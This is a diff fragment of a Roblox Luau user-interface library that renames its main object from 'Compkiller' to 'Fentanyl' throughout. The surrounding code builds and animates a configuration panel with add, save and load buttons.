 			SectionText.AnchorPoint = Vector2.new(0, 0.5)
 			SectionText.BackgroundTransparency = 1.000
@@ -6209,17 +6209,17 @@
 			SectionText.ZIndex = 10
 			SectionText.Font = Enum.Font.GothamMedium
 			SectionText.Text = "Config List"
-			SectionText.TextColor3 = Compkiller.Colors.SwitchColor
+			SectionText.TextColor3 = Fentanyl.Colors.SwitchColor
 			SectionText.TextSize = 14.000
 			SectionText.TextTransparency = 0.500
 			SectionText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = SectionText,
 				Property = 'TextColor3'
 			});
 
-			SectionClose.Name = Compkiller:_RandomString()
+			SectionClose.Name = Fentanyl:_RandomString()
 			SectionClose.Parent = Header
 			SectionClose.AnchorPoint = Vector2.new(1, 0.5)
 			SectionClose.BackgroundTransparency = 1.000
@@ -6247,18 +6247,18 @@
 			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 			UIListLayout.Padding = UDim.new(0, 7)
 
-			Space.Name = Compkiller:_RandomString()
+			Space.Name = Fentanyl:_RandomString()
 			Space.Parent = ScrollingFrame
 			Space.BackgroundTransparency = 1.000
 			Space.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Space.BorderSizePixel = 0
 
-			AddConfig.Name = Compkiller:_RandomString()
+			AddConfig.Name = Fentanyl:_RandomString()
 			AddConfig.Parent = TabConfig
 			AddConfig.AnchorPoint = Vector2.new(0.5, 1)
-			AddConfig.BackgroundColor3 = Compkiller.Colors.BlockColor
+			AddConfig.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-			table.insert(Compkiller.Elements.BlockColor , {
+			table.insert(Fentanyl.Elements.BlockColor , {
 				Element = AddConfig,
 				Property = "BackgroundColor3"
 			});
@@ -6272,15 +6272,15 @@
 			UICorner_2.CornerRadius = UDim.new(0, 6)
 			UICorner_2.Parent = AddConfig
 
-			UIStroke_2.Color = Compkiller.Colors.StrokeColor
+			UIStroke_2.Color = Fentanyl.Colors.StrokeColor
 			UIStroke_2.Parent = AddConfig
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke_2,
 				Property = "Color"
 			});
 
-			Header_2.Name = Compkiller:_RandomString()
+			Header_2.Name = Fentanyl:_RandomString()
 			Header_2.Parent = AddConfig
 			Header_2.BackgroundTransparency = 1.000
 			Header_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6288,7 +6288,7 @@
 			Header_2.Size = UDim2.new(1, 0, 0, 35)
 			Header_2.ZIndex = 9
 
-			SectionText_2.Name = Compkiller:_RandomString()
+			SectionText_2.Name = Fentanyl:_RandomString()
 			SectionText_2.Parent = Header_2
 			SectionText_2.AnchorPoint = Vector2.new(0, 0.5)
 			SectionText_2.BackgroundTransparency = 1.000
@@ -6299,17 +6299,17 @@
 			SectionText_2.ZIndex = 10
 			SectionText_2.Font = Enum.Font.GothamMedium
 			SectionText_2.Text = "Add Config"
-			SectionText_2.TextColor3 = Compkiller.Colors.SwitchColor
+			SectionText_2.TextColor3 = Fentanyl.Colors.SwitchColor
 			SectionText_2.TextSize = 14.000
 			SectionText_2.TextTransparency = 0.500
 			SectionText_2.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = SectionText_2,
 				Property = 'TextColor3'
 			});
 
-			SectionClose_2.Name = Compkiller:_RandomString()
+			SectionClose_2.Name = Fentanyl:_RandomString()
 			SectionClose_2.Parent = Header_2
 			SectionClose_2.AnchorPoint = Vector2.new(1, 0.5)
 			SectionClose_2.BackgroundTransparency = 1.000
@@ -6323,9 +6323,9 @@
 
 			Frame.Parent = AddConfig
 			Frame.AnchorPoint = Vector2.new(0.5, 0)
-			Frame.BackgroundColor3 = Compkiller.Colors.BlockColor
+			Frame.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-			table.insert(Compkiller.Elements.BlockColor , {
+			table.insert(Fentanyl.Elements.BlockColor , {
 				Element = Frame,
 				Property = "BackgroundColor3"
 			});
@@ -6336,10 +6336,10 @@
 			Frame.Size = UDim2.new(1, -20, 0, 20)
 			Frame.ZIndex = 15
 
-			UIStroke_3.Color = Compkiller.Colors.StrokeColor
+			UIStroke_3.Color = Fentanyl.Colors.StrokeColor
 			UIStroke_3.Parent = Frame
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke_3,
 				Property = "Color"
 			});
@@ -6360,19 +6360,19 @@
 			TextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
 			TextBox.PlaceholderText = "Config Name..."
 			TextBox.Text = ""
-			TextBox.TextColor3 = Compkiller.Colors.SwitchColor
+			TextBox.TextColor3 = Fentanyl.Colors.SwitchColor
 			TextBox.TextSize = 12.000
 			TextBox.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = TextBox,
 				Property = 'TextColor3'
 			});
 
-			Button.Name = Compkiller:_RandomString()
+			Button.Name = Fentanyl:_RandomString()
 			Button.Parent = AddConfig
 			Button.AnchorPoint = Vector2.new(0.5, 1)
-			Button.BackgroundColor3 = Compkiller.Colors.SwitchColor
+			Button.BackgroundColor3 = Fentanyl.Colors.SwitchColor
 			Button.BackgroundTransparency = 1.000
 			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Button.BorderSizePixel = 0
@@ -6380,10 +6380,10 @@
 			Button.Size = UDim2.new(1, -7, 0, 25)
 			Button.ZIndex = 10
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = AddConfig
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -6391,14 +6391,14 @@
 			BlockLine.Size = UDim2.new(1, -26, 0, 1)
 			BlockLine.ZIndex = 12
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
 
 			Frame_2.Parent = Button
 			Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
-			Frame_2.BackgroundColor3 = Compkiller.Colors.Highlight
+			Frame_2.BackgroundColor3 = Fentanyl.Colors.Highlight
 			Frame_2.BackgroundTransparency = 0.100
 			Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Frame_2.BorderSizePixel = 0
@@ -6406,15 +6406,15 @@
 			Frame_2.Size = UDim2.new(1, -15, 1, -5)
 			Frame_2.ZIndex = 9
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = Frame_2,
 				Property = "BackgroundColor3"
 			});
 
-			UIStroke_4.Color = Compkiller.Colors.StrokeColor
+			UIStroke_4.Color = Fentanyl.Colors.StrokeColor
 			UIStroke_4.Parent = Frame_2
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke_4,
 				Property = "Color"
 			});
@@ -6432,11 +6432,11 @@
 			TextLabel.ZIndex = 10
 			TextLabel.Font = Enum.Font.GothamMedium
 			TextLabel.Text = "Add Config"
-			TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+			TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 			TextLabel.TextSize = 12.000
 			TextLabel.TextStrokeTransparency = 0.900
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = TextLabel,
 				Property = 'TextColor3'
 			});
@@ -6456,152 +6456,152 @@
 
 					WindowArgs.SelectedTab = TabButton;
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0,
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						BackgroundTransparency = 0.925
 					});
 
 					--
 
-					Compkiller:_Animation(ConfigList,Tween,{
+					Fentanyl:_Animation(ConfigList,Tween,{
 						BackgroundTransparency = 0,
 					});
 
-					Compkiller:_Animation(AddConfig,Tween,{
+					Fentanyl:_Animation(AddConfig,Tween,{
 						BackgroundTransparency = 0,
 					});
 
-					Compkiller:_Animation(UIStroke_4,Tween,{
+					Fentanyl:_Animation(UIStroke_4,Tween,{
 						Transparency = 0,
 					});
 
-					Compkiller:_Animation(UIStroke_3,Tween,{
+					Fentanyl:_Animation(UIStroke_3,Tween,{
 						Transparency = 0,
 					});
 
-					Compkiller:_Animation(UIStroke_2,Tween,{
+					Fentanyl:_Animation(UIStroke_2,Tween,{
 						Transparency = 0,
 					});
 
-					Compkiller:_Animation(UIStroke,Tween,{
+					Fentanyl:_Animation(UIStroke,Tween,{
 						Transparency = 0,
 					});
 
-					Compkiller:_Animation(SectionText,Tween,{
+					Fentanyl:_Animation(SectionText,Tween,{
 						TextTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TextLabel,Tween,{
+					Fentanyl:_Animation(TextLabel,Tween,{
 						TextTransparency = 0,
 						TextStrokeTransparency = 0.9
 					});
 
-					Compkiller:_Animation(Frame_2,Tween,{
+					Fentanyl:_Animation(Frame_2,Tween,{
 						BackgroundTransparency = 0.1,
 					});
 
-					Compkiller:_Animation(BlockLine,Tween,{
+					Fentanyl:_Animation(BlockLine,Tween,{
 						BackgroundTransparency = 0.5,
 					});
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 0,
 					});
 
-					Compkiller:_Animation(SectionText_2,Tween,{
+					Fentanyl:_Animation(SectionText_2,Tween,{
 						TextTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TextBox,Tween,{
+					Fentanyl:_Animation(TextBox,Tween,{
 						TextTransparency = 0
 					});
 
-					Compkiller:_Animation(SectionClose,Tween,{
+					Fentanyl:_Animation(SectionClose,Tween,{
 						ImageTransparency = 0.5,
 					});
 
-					Compkiller:_Animation(SectionClose_2,Tween,{
+					Fentanyl:_Animation(SectionClose_2,Tween,{
 						ImageTransparency = 0.5,
 					});
 				else
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.5
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						BackgroundTransparency = 1
 					});
 
-					Compkiller:_Animation(ConfigList,Tween,{
+					Fentanyl:_Animation(ConfigList,Tween,{
 						BackgroundTransparency = 1,
 					});
 
-					Compkiller:_Animation(AddConfig,Tween,{
+					Fentanyl:_Animation(AddConfig,Tween,{
 						BackgroundTransparency = 1,
 					});
 
-					Compkiller:_Animation(UIStroke_4,Tween,{
+					Fentanyl:_Animation(UIStroke_4,Tween,{
 						Transparency = 1,
 					});
 
-					Compkiller:_Animation(UIStroke_3,Tween,{
+					Fentanyl:_Animation(UIStroke_3,Tween,{
 						Transparency = 1,
 					});
 
-					Compkiller:_Animation(UIStroke_2,Tween,{
+					Fentanyl:_Animation(UIStroke_2,Tween,{
 						Transparency = 1,
 					});
 
-					Compkiller:_Animation(UIStroke,Tween,{
+					Fentanyl:_Animation(UIStroke,Tween,{
 						Transparency = 1,
 					});
 
-					Compkiller:_Animation(SectionText,Tween,{
+					Fentanyl:_Animation(SectionText,Tween,{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(TextLabel,Tween,{
+					Fentanyl:_Animation(TextLabel,Tween,{
 						TextTransparency = 1,
 						TextStrokeTransparency = 1
 					});
 
-					Compkiller:_Animation(Frame_2,Tween,{
+					Fentanyl:_Animation(Frame_2,Tween,{
 						BackgroundTransparency = 1,
 					});
 
-					Compkiller:_Animation(BlockLine,Tween,{
+					Fentanyl:_Animation(BlockLine,Tween,{
 						BackgroundTransparency = 1,
 					});
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 1,
 					});
 
-					Compkiller:_Animation(SectionText_2,Tween,{
+					Fentanyl:_Animation(SectionText_2,Tween,{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(TextBox,Tween,{
+					Fentanyl:_Animation(TextBox,Tween,{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(SectionClose,Tween,{
+					Fentanyl:_Animation(SectionClose,Tween,{
 						ImageTransparency = 1,
 					});
 
-					Compkiller:_Animation(SectionClose_2,Tween,{
+					Fentanyl:_Animation(SectionClose_2,Tween,{
 						ImageTransparency = 1,
 					});
 				end;
@@ -6619,23 +6619,23 @@
 				Remote = TabOpenSignal
 			});
 
-			Compkiller:_Hover(TabButton,function()
+			Fentanyl:_Hover(TabButton,function()
 				if WindowArgs.SelectedTab ~= TabButton then
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.1
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.1
 					});
 				end;
 			end , function()
 				if WindowArgs.SelectedTab ~= TabButton then
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						ImageTransparency = 0.5
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						TextTransparency = 0.5
 					});
 				end;
@@ -6645,55 +6645,55 @@
 
 			TabHover:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(TabButton,Tween,{
+					Fentanyl:_Animation(TabButton,Tween,{
 						Size = UDim2.new(1, -10, 0, 32)
 					});
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						Position = UDim2.new(0, 15, 0.5, 0),
 						Size = UDim2.new(0, 22, 0, 22),
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						Size = UDim2.new(0, 200, 0, 25),
 						Position = UDim2.new(0, 43, 0.5, 0)
 					});
 
-					Compkiller:_Animation(UICorner,Tween,{
+					Fentanyl:_Animation(UICorner,Tween,{
 						CornerRadius = UDim.new(0, 4)
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						Size = UDim2.new(1, -17, 1, 0),
 						Position = UDim2.new(0.5, 0, 0.5, 0)
 					});
 				else
-					Compkiller:_Animation(UICorner,Tween,{
+					Fentanyl:_Animation(UICorner,Tween,{
 						CornerRadius = UDim.new(0, 10)
 					});
 
-					Compkiller:_Animation(TabButton,Tween,{
+					Fentanyl:_Animation(TabButton,Tween,{
 						Size = UDim2.new(1, -10, 0, 32)
 					});
 
-					Compkiller:_Animation(Icon,Tween,{
+					Fentanyl:_Animation(Icon,Tween,{
 						Position = UDim2.new(0, 12, 0.5, 0),
 						Size = UDim2.new(0, 20, 0, 20),
 					});
 
-					Compkiller:_Animation(TabNameLabel,Tween,{
+					Fentanyl:_Animation(TabNameLabel,Tween,{
 						Size = UDim2.new(0, 200, 0, 25),
 						Position = UDim2.new(0, 80, 0.5, 0)
 					});
 
-					Compkiller:_Animation(Highlight,Tween,{
+					Fentanyl:_Animation(Highlight,Tween,{
 						Size = UDim2.new(1, -10,1, 5),
 						Position = UDim2.new(0.5, 0, 0.5, 0)
 					});
 				end;
 			end);
 
-			Compkiller:_Input(TabButton,function()
+			Fentanyl:_Input(TabButton,function()
 				for i,v in next, WindowArgs.Tabs do
 					if v.Root == TabButton then
 						v.Remote:Fire(true);
@@ -6729,7 +6729,7 @@
 				local UICorner = Instance.new("UICorner")
 				local UIGradient = Instance.new("UIGradient")
 
-				DelButton.Name = Compkiller:_RandomString()
+				DelButton.Name = Fentanyl:_RandomString()
 				DelButton.Parent = LinkValues
 				DelButton.BackgroundTransparency = 1.000
 				DelButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6744,7 +6744,7 @@
 
 				UICorner.CornerRadius = UDim.new(1, 0)
 				UICorner.Parent = DelButton
-				ConfigBlock.Name = Compkiller:_RandomString()
+				ConfigBlock.Name = Fentanyl:_RandomString()
 				ConfigBlock.Parent = ScrollingFrame
 				ConfigBlock.BackgroundColor3 = Color3.fromRGB(33, 34, 40)
 				ConfigBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6753,11 +6753,11 @@
 				ConfigBlock.Size = UDim2.new(1, -1, 0, 40)
 				ConfigBlock.ZIndex = 10
 
-				if Compkiller:_IsMobile() then
-					Compkiller:_AddDragBlacklist(ConfigBlock);
+				if Fentanyl:_IsMobile() then
+					Fentanyl:_AddDragBlacklist(ConfigBlock);
 				end;
 
-				ConfigText.Name = Compkiller:_RandomString()
+				ConfigText.Name = Fentanyl:_RandomString()
 				ConfigText.Parent = ConfigBlock
 				ConfigText.AnchorPoint = Vector2.new(0, 0.5)
 				ConfigText.BackgroundTransparency = 1.000
@@ -6769,12 +6769,12 @@
 				ConfigText.Font = Enum.Font.GothamMedium
 				ConfigText.RichText = true;
 				ConfigText.Text = "Config"
-				ConfigText.TextColor3 = Compkiller.Colors.SwitchColor
+				ConfigText.TextColor3 = Fentanyl.Colors.SwitchColor
 				ConfigText.TextSize = 13.000
 				ConfigText.TextTransparency = 1
 				ConfigText.TextXAlignment = Enum.TextXAlignment.Left
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = ConfigText,
 					Property = 'TextColor3'
 				});
@@ -6782,7 +6782,7 @@
 				UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.29, 0.00), NumberSequenceKeypoint.new(0.33, 1.00), NumberSequenceKeypoint.new(1.00, 1.00)}
 				UIGradient.Parent = ConfigText
 
-				LinkValues.Name = Compkiller:_RandomString()
+				LinkValues.Name = Fentanyl:_RandomString()
 				LinkValues.Parent = ConfigBlock
 				LinkValues.AnchorPoint = Vector2.new(1, 0.540000021)
 				LinkValues.BackgroundTransparency = 1.000
@@ -6799,7 +6799,7 @@
 				UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
 				UIListLayout.Padding = UDim.new(0, -10)
 
-				SaveButton.Name = Compkiller:_RandomString()
+				SaveButton.Name = Fentanyl:_RandomString()
 				SaveButton.Parent = LinkValues
 				SaveButton.BackgroundTransparency = 1.000
 				SaveButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6809,7 +6809,7 @@
 
 				Frame.Parent = SaveButton
 				Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-				Frame.BackgroundColor3 = Compkiller.Colors.Highlight
+				Frame.BackgroundColor3 = Fentanyl.Colors.Highlight
 				Frame.BackgroundTransparency = 1
 				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				Frame.BorderSizePixel = 0
@@ -6817,16 +6817,16 @@
 				Frame.Size = UDim2.new(1, -15, 1, -5)
 				Frame.ZIndex = 14
 
-				table.insert(Compkiller.Elements.Highlight,{
+				table.insert(Fentanyl.Elements.Highlight,{
 					Element = Frame,
 					Property = "BackgroundColor3"
 				});
 
 				UIStroke.Transparency = 1
-				UIStroke.Color = Compkiller.Colors.StrokeColor
+				UIStroke.Color = Fentanyl.Colors.StrokeColor
 				UIStroke.Parent = Frame
 
-				table.insert(Compkiller.Elements.StrokeColor,{
+				table.insert(Fentanyl.Elements.StrokeColor,{
 					Element = UIStroke,
 					Property = "Color"
 				});
@@ -6844,18 +6844,18 @@
 				TextLabel.ZIndex = 14
 				TextLabel.Font = Enum.Font.GothamMedium
 				TextLabel.Text = "Save"
-				TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+				TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 				TextLabel.TextSize = 12.000
 				TextLabel.TextStrokeTransparency = 1
 				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
 				TextLabel.TextTransparency = 1
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = TextLabel,
 					Property = 'TextColor3'
 				});
 
-				Icon.Name = Compkiller:_RandomString()
+				Icon.Name = Fentanyl:_RandomString()
 				Icon.Parent = Frame
 				Icon.AnchorPoint = Vector2.new(0, 0.5)
 				Icon.BackgroundTransparency = 1.000
@@ -6868,7 +6868,7 @@
 				Icon.Image = "rbxassetid://10734941499"
 				Icon.ImageTransparency = 1;
 
-				LoadButton.Name = Compkiller:_RandomString()
+				LoadButton.Name = Fentanyl:_RandomString()
 				LoadButton.Parent = LinkValues
 				LoadButton.BackgroundTransparency = 1.000
 				LoadButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -6878,7 +6878,7 @@
 
 				Frame_2.Parent = LoadButton
 				Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
-				Frame_2.BackgroundColor3 = Compkiller.Colors.Highlight
+				Frame_2.BackgroundColor3 = Fentanyl.Colors.Highlight
 				Frame_2.BackgroundTransparency = 1
 				Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				Frame_2.BorderSizePixel = 0
@@ -6886,16 +6886,16 @@
 				Frame_2.Size = UDim2.new(1, -15, 1, -5)
 				Frame_2.ZIndex = 14
 
-				table.insert(Compkiller.Elements.Highlight,{
+				table.insert(Fentanyl.Elements.Highlight,{
 					Element = Frame_2,
 					Property = "BackgroundColor3"
 				});
 
 				UIStroke_2.Transparency = 1
-				UIStroke_2.Color = Compkiller.Colors.StrokeColor
+				UIStroke_2.Color = Fentanyl.Colors.StrokeColor
 				UIStroke_2.Parent = Frame_2
 
-				table.insert(Compkiller.Elements.StrokeColor,{
+				table.insert(Fentanyl.Elements.StrokeColor,{
 					Element = UIStroke_2,
 					Property = "Color"
 				});
@@ -6913,18 +6913,18 @@
 				TextLabel_2.ZIndex = 14
 				TextLabel_2.Font = Enum.Font.GothamMedium
 				TextLabel_2.Text = "Load"
-				TextLabel_2.TextColor3 = Compkiller.Colors.SwitchColor
+				TextLabel_2.TextColor3 = Fentanyl.Colors.SwitchColor
 				TextLabel_2.TextSize = 12.000
 				TextLabel_2.TextStrokeTransparency = 1
 				TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
 				TextLabel_2.TextTransparency = 1
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = TextLabel_2,
 					Property = 'TextColor3'
 				});
 
-				Icon_2.Name = Compkiller:_RandomString()
+				Icon_2.Name = Fentanyl:_RandomString()
 				Icon_2.Parent = Frame_2
 				Icon_2.AnchorPoint = Vector2.new(0, 0.5)
 				Icon_2.BackgroundTransparency = 1.000
@@ -6938,10 +6938,10 @@
 				Icon_2.ImageTransparency = 1
 				UIStroke_3.Transparency = 1
 
-				UIStroke_3.Color = Compkiller.Colors.StrokeColor
+				UIStroke_3.Color = Fentanyl.Colors.StrokeColor
 				UIStroke_3.Parent = ConfigBlock
 
-				table.insert(Compkiller.Elements.StrokeColor,{
+				table.insert(Fentanyl.Elements.StrokeColor,{
 					Element = UIStroke_3,
 					Property = "Color"
 				});
@@ -6949,7 +6949,7 @@
 				UICorner_3.CornerRadius = UDim.new(0, 6)
 				UICorner_3.Parent = ConfigBlock
 
-				AuthorText.Name = Compkiller:_RandomString()
+				AuthorText.Name = Fentanyl:_RandomString()
 				AuthorText.Parent = ConfigBlock
 				AuthorText.AnchorPoint = Vector2.new(0, 0.5)
 				AuthorText.BackgroundTransparency = 1.000
@@ -6961,18 +6961,18 @@
 				AuthorText.Font = Enum.Font.GothamMedium
 				AuthorText.RichText = true;
 				AuthorText.Text = "Author: <font color=\"rgb(17, 238, 253)\">NoFi</font>"
-				AuthorText.TextColor3 = Compkiller.Colors.SwitchColor
+				AuthorText.TextColor3 = Fentanyl.Colors.SwitchColor
 				AuthorText.TextSize = 13.000
 				AuthorText.TextTransparency = 1
 				AuthorText.TextXAlignment = Enum.TextXAlignment.Left
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = TabNameLabel,
 					Property = 'TextColor3'
 				});
 
 				function ConfigButton:SetInfo(Author , ConfigName)
-					local R,G,B = tostring(math.floor(Compkiller.Colors.Highlight.R * 255)) , tostring(math.floor(Compkiller.Colors.Highlight.G * 255)) , tostring(math.floor(Compkiller.Colors.Highlight.B * 255));
+					local R,G,B = tostring(math.floor(Fentanyl.Colors.Highlight.R * 255)) , tostring(math.floor(Fentanyl.Colors.Highlight.G * 255)) , tostring(math.floor(Fentanyl.Colors.Highlight.B * 255));
 
 					AuthorText.Text = string.format("Author: <font color=\"rgb(%s, %s, %s)\">%s</font>" ,R,G,B , tostring(Author));
 					ConfigText.Text = ConfigName;
@@ -6984,106 +6984,106 @@
 
 				function ConfigButton:Toggle(v)
 					if v then
-						Compkiller:_Animation(ConfigBlock,Tween,{
+						Fentanyl:_Animation(ConfigBlock,Tween,{
 							BackgroundTransparency = 0
 						});
 
-						Compkiller:_Animation(LinkValues,Tween,{
+						Fentanyl:_Animation(LinkValues,Tween,{
 							Position = UDim2.new(1, -12, 0.5, 0)
 						});
 
-						Compkiller:_Animation(ConfigText,Tween,{
+						Fentanyl:_Animation(ConfigText,Tween,{
 							TextTransparency = 0.3,
 							Position = UDim2.new(0, 12, 0.5, 0)
 						});
 
-						Compkiller:_Animation(Frame,Tween,{
+						Fentanyl:_Animation(Frame,Tween,{
 							BackgroundTransparency = 0.100
 						});
 
-						Compkiller:_Animation(UIStroke,Tween,{
+						Fentanyl:_Animation(UIStroke,Tween,{
 							Transparency = 0
 						});
 
-						Compkiller:_Animation(AuthorText,Tween,{
+						Fentanyl:_Animation(AuthorText,Tween,{
 							TextTransparency = 0.5,
 							Position = UDim2.new(0,AuthorText:GetAttribute('SPC'), 0.5, 0)
 						});
 
-						Compkiller:_Animation(Icon_2,Tween,{
+						Fentanyl:_Animation(Icon_2,Tween,{
 							ImageTransparency = 0
 						});
 
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 0
 						});
 
-						Compkiller:_Animation(Frame_2,Tween,{
+						Fentanyl:_Animation(Frame_2,Tween,{
 							BackgroundTransparency = 0.100
 						});
 
-						Compkiller:_Animation(UIStroke_2,Tween,{
+						Fentanyl:_Animation(UIStroke_2,Tween,{
 							Transparency = 0
 						});
 
-						Compkiller:_Animation(TextLabel,Tween,{
+						Fentanyl:_Animation(TextLabel,Tween,{
 							TextStrokeTransparency = 0.900,
 							TextTransparency = 0
 						});
 
-						Compkiller:_Animation(TextLabel_2,Tween,{
+						Fentanyl:_Animation(TextLabel_2,Tween,{
 							TextStrokeTransparency = 0.900,
 							TextTransparency = 0
 						});
 					else
-						Compkiller:_Animation(AuthorText,Tween,{
+						Fentanyl:_Animation(AuthorText,Tween,{
 							TextTransparency = 1,
 							Position = UDim2.new(0.5, -65, 0.5, 15)
 						});
 
-						Compkiller:_Animation(Icon_2,Tween,{
+						Fentanyl:_Animation(Icon_2,Tween,{
 							ImageTransparency = 1
 						});
 
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 1
 						});
 
-						Compkiller:_Animation(LinkValues,Tween,{
+						Fentanyl:_Animation(LinkValues,Tween,{
 							Position = UDim2.new(1, -12, 0.5, 15)
 						});
 
-						Compkiller:_Animation(ConfigBlock,Tween,{
+						Fentanyl:_Animation(ConfigBlock,Tween,{
 							BackgroundTransparency = 1
 						});
 
-						Compkiller:_Animation(ConfigText,Tween,{
+						Fentanyl:_Animation(ConfigText,Tween,{
 							TextTransparency = 1,
 							Position = UDim2.new(0, 12, 0.5, 15)
 						});
 
-						Compkiller:_Animation(Frame,Tween,{
+						Fentanyl:_Animation(Frame,Tween,{
 							BackgroundTransparency = 1
 						});
 
-						Compkiller:_Animation(UIStroke,Tween,{
+						Fentanyl:_Animation(UIStroke,Tween,{
 							Transparency = 1
 						});
 
-						Compkiller:_Animation(Frame_2,Tween,{
+						Fentanyl:_Animation(Frame_2,Tween,{
 							BackgroundTransparency = 1
 						});
 
-						Compkiller:_Animation(UIStroke_2,Tween,{
+						Fentanyl:_Animation(UIStroke_2,Tween,{
 							Transparency = 1
 						});
 
-						Compkiller:_Animation(TextLabel,Tween,{
+						Fentanyl:_Animation(TextLabel,Tween,{
 							TextStrokeTransparency = 1,
 							TextTransparency = 1
 						});
 
-						Compkiller:_Animation(TextLabel_2,Tween,{
+						Fentanyl:_Animation(TextLabel_2,Tween,{
 							TextStrokeTransparency = 1,
 							TextTransparency = 1
 						});
@@ -7100,11 +7100,11 @@
 
 				ConfigButton:Update();
 
-				Compkiller:_Input(LoadButton,function()
+				Fentanyl:_Input(LoadButton,function()
 					task.spawn(ConfigButton.OnLoad);
 				end);
 
-				Compkiller:_Input(SaveButton,function()
